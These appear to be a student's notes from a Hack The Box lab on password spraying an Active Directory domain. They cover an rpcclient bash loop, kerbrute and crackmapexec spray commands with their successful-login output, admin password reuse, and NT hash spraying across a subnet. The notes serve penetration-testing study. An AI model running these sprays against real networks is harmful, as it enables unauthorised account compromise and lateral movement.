so this is after we curated our user list from last section and getting cracks on the kerbrute <- hint we should prolly use this lol 

from linux rpcclient is an excellent option 
An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response

*bash one liner for the attack 
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

so full syntax will look like this -> 
MJBUCKNER@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT

we could also use Kerbrute 
SYNTAX: 
MJBUCKNER@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1      <--- so we put the 56 valid users in the user.txt and use Welcome1 as password to try

We could also use CME and grep out hte reuslts

CME SYNTAX: 
MJBUCKNER@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 

Then we use CME to also validate 
SYNTAX: 
MJBUCKNER@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123

Local Administrator Password Reuse
When working with local administrator accounts, one consideration is password re-use or common password formats across accounts. If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers.

 If we retrieve the password for a user named ajones, it is worth trying the same password on their admin account (if the user has one), for example, ajones_adm, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.

Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.
